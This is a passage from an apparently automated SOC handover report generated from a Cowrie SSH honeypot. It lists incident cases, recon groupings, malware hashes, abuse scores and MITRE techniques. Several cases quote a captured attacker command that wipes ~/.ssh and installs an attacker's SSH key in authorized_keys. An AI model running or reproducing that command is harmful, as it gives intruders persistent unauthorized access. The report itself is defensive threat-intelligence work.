| `2026-04-09 20:34:59` | `cowrie.log.closed` |
| `2026-04-09 20:35:00` | `cowrie.session.params` |
| `2026-04-09 20:35:00` | `cowrie.command.input` |
| `2026-04-09 20:35:00` | `cowrie.session.file_download` |
| `2026-04-09 20:35:00` | `cowrie.log.closed` |
| `2026-04-09 20:35:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.93.249[.]106` to AbuseIPDB if not already reported
- [ ] Block `36.93.249[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-910a4243361f

| Field | Detail |
|---|---|
| **Source IP** | `36.93.249[.]106` |
| **First Seen** | 2026-04-09 20:35 |
| **Last Seen** | 2026-04-09 20:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 20:35:02` | `cowrie.session.connect` |
| `2026-04-09 20:35:02` | `cowrie.client.version` |
| `2026-04-09 20:35:02` | `cowrie.client.kex` |
| `2026-04-09 20:35:02` | `cowrie.login.success` |
| `2026-04-09 20:35:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.93.249[.]106` to AbuseIPDB if not already reported
- [ ] Block `36.93.249[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72ed99b1b90c

| Field | Detail |
|---|---|
| **Source IP** | `36.93.249[.]106` |
| **First Seen** | 2026-04-09 20:40 |
| **Last Seen** | 2026-04-09 20:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 20:40:14` | `cowrie.session.connect` |
| `2026-04-09 20:40:14` | `cowrie.client.version` |
| `2026-04-09 20:40:14` | `cowrie.client.kex` |
| `2026-04-09 20:40:15` | `cowrie.login.success` |
| `2026-04-09 20:40:15` | `cowrie.session.params` |
| `2026-04-09 20:40:15` | `cowrie.command.input` |
| `2026-04-09 20:40:15` | `cowrie.command.failed` |
| `2026-04-09 20:40:15` | `cowrie.log.closed` |
| `2026-04-09 20:40:15` | `cowrie.session.params` |
| `2026-04-09 20:40:15` | `cowrie.command.input` |
| `2026-04-09 20:40:15` | `cowrie.session.file_download` |
| `2026-04-09 20:40:15` | `cowrie.log.closed` |
| `2026-04-09 20:40:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.93.249[.]106` to AbuseIPDB if not already reported
- [ ] Block `36.93.249[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68e9a63039ba

| Field | Detail |
|---|---|
| **Source IP** | `36.93.249[.]106` |
| **First Seen** | 2026-04-09 20:40 |
| **Last Seen** | 2026-04-09 20:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 20:40:17` | `cowrie.session.connect` |
| `2026-04-09 20:40:17` | `cowrie.client.version` |
| `2026-04-09 20:40:17` | `cowrie.client.kex` |
| `2026-04-09 20:40:17` | `cowrie.login.success` |
| `2026-04-09 20:40:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.93.249[.]106` to AbuseIPDB if not already reported
- [ ] Block `36.93.249[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-095d55bfef2b

| Field | Detail |
|---|---|
| **Source IP** | `36.93.249[.]106` |
| **First Seen** | 2026-04-09 20:42 |
| **Last Seen** | 2026-04-09 20:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 20:42:03` | `cowrie.session.connect` |
| `2026-04-09 20:42:03` | `cowrie.client.version` |
| `2026-04-09 20:42:03` | `cowrie.client.kex` |
| `2026-04-09 20:42:04` | `cowrie.login.success` |
| `2026-04-09 20:42:04` | `cowrie.session.params` |
| `2026-04-09 20:42:04` | `cowrie.command.input` |
| `2026-04-09 20:42:04` | `cowrie.command.failed` |
| `2026-04-09 20:42:04` | `cowrie.log.closed` |
| `2026-04-09 20:42:04` | `cowrie.session.params` |
| `2026-04-09 20:42:04` | `cowrie.command.input` |
| `2026-04-09 20:42:04` | `cowrie.session.file_download` |
| `2026-04-09 20:42:04` | `cowrie.log.closed` |
| `2026-04-09 20:42:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.93.249[.]106` to AbuseIPDB if not already reported
- [ ] Block `36.93.249[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-198fd3a59df6

| Field | Detail |
|---|---|
| **Source IP** | `36.93.249[.]106` |
| **First Seen** | 2026-04-09 20:42 |
| **Last Seen** | 2026-04-09 20:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 20:42:06` | `cowrie.session.connect` |
| `2026-04-09 20:42:06` | `cowrie.client.version` |
| `2026-04-09 20:42:06` | `cowrie.client.kex` |
| `2026-04-09 20:42:06` | `cowrie.login.success` |
| `2026-04-09 20:42:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.93.249[.]106` to AbuseIPDB if not already reported
- [ ] Block `36.93.249[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93ea6cb09cd6

| Field | Detail |
|---|---|
| **Source IP** | `36.93.249[.]106` |
| **First Seen** | 2026-04-09 20:45 |
| **Last Seen** | 2026-04-09 20:45 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 20:45:23` | `cowrie.session.connect` |
| `2026-04-09 20:45:23` | `cowrie.client.version` |
| `2026-04-09 20:45:23` | `cowrie.client.kex` |
| `2026-04-09 20:45:24` | `cowrie.login.success` |
| `2026-04-09 20:45:24` | `cowrie.session.params` |
| `2026-04-09 20:45:24` | `cowrie.command.input` |
| `2026-04-09 20:45:24` | `cowrie.command.failed` |
| `2026-04-09 20:45:24` | `cowrie.log.closed` |
| `2026-04-09 20:45:24` | `cowrie.session.params` |
| `2026-04-09 20:45:24` | `cowrie.command.input` |
| `2026-04-09 20:45:24` | `cowrie.session.file_download` |
| `2026-04-09 20:45:24` | `cowrie.log.closed` |
| `2026-04-09 20:45:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.93.249[.]106` to AbuseIPDB if not already reported
- [ ] Block `36.93.249[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42769d171277

| Field | Detail |
|---|---|
| **Source IP** | `36.93.249[.]106` |
| **First Seen** | 2026-04-09 20:45 |
| **Last Seen** | 2026-04-09 20:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 20:45:26` | `cowrie.session.connect` |
| `2026-04-09 20:45:26` | `cowrie.client.version` |
| `2026-04-09 20:45:26` | `cowrie.client.kex` |
| `2026-04-09 20:45:26` | `cowrie.login.success` |
| `2026-04-09 20:45:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.93.249[.]106` to AbuseIPDB if not already reported
- [ ] Block `36.93.249[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `36.93.249[.]106` | **14** | 2026-04-09 20:19 | 2026-04-09 20:45 | 0m | 14 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `176.65.139[.]67` | **10** | 2026-04-09 19:07 | 2026-04-09 19:07 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.142.26[.]46` | 1 | 2026-04-09 20:23 | 2026-04-09 20:23 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `105.224.222[.]153` | 1 | 2026-04-09 20:28 | 2026-04-09 20:29 | 30s | 0 | `T1592` | 🟢 LOW |
| `118.145.246[.]159` | 1 | 2026-04-09 20:21 | 2026-04-09 20:21 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (22 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 30/100 | 🟢 LOW | Not in VT |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `105.224.222[.]153` | ZA | Telkom SA Ltd. | **100** ⚠️ | 3 |
| `118.145.246[.]159` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 4 |
| `176.65.139[.]67` | NL | Storm Industries | **100** ⚠️ | 0 |
| `103.142.26[.]46` | VN | Tino Group Joint Stock Company | **100** ⚠️ | 0 |
| `36.93.249[.]106` | ID | PT Telekomunikasi Indonesia | **100** ⚠️ | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 51 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 26 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 25 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 8 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 7 |

---

## 🔕 False Positive Summary (1 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 53 cases |
| Tool 34  | Credential Extractor        | ✅ 51 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 2 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 6 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 1 filtered (1.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 6 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 22 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 25 priority case(s) shown individually · 5 recon entry/entries in table (2 group(s) consolidating 24 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-09T20:47:44Z_
